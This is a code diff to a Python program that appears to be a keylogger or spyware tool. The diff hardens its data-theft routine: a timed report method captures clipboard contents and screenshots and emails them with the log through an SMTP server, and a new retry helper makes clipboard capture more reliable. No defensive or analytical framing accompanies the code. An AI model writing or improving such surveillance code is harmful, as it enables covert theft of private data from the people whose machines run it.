@@ -70,25 +70,33 @@ finally:
             msg.attach(MIMEText(message, 'plain'))
 
             if attachment_path:
-                attachment = open(attachment_path, "rb")
-                part = MIMEBase('application', 'octet-stream')
-                part.set_payload(attachment.read())
-                encoders.encode_base64(part)
-                part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
-                msg.attach(part)
-                attachment.close()
+                with open(attachment_path, "rb") as attachment:
+                    part = MIMEBase('application', 'octet-stream')
+                    part.set_payload(attachment.read())
+                    encoders.encode_base64(part)
+                    part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
+                    msg.attach(part)
 
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                 server.login(email, password)
                 server.sendmail(email, email, msg.as_string())
 
         def report(self):
-            self.appendlog("\nClipboard content: " + pyperclip.paste() + "\n")
+            self.appendlog("\nClipboard content: " + self.get_clipboard_content() + "\n")
             screenshot_path = self.screenshot()
             self.send_mail(self.email, self.password, "\n\n" + self.log, screenshot_path)
             self.log = ""
             timer = threading.Timer(self.interval, self.report)
             timer.start()
+
+        def get_clipboard_content(self, max_retries=5):
+            for i in range(max_retries):
+                try:
+                    return pyperclip.paste()
+                except pyperclip.PyperclipException as e:
+                    self.appendlog(f"Error accessing clipboard (attempt {i+1}): {e}\n")
+                    time.sleep(1)  # Wait a bit before retrying
+            return "Could not access clipboard"
 
         def system_information(self):
             hostname = socket.gethostname()
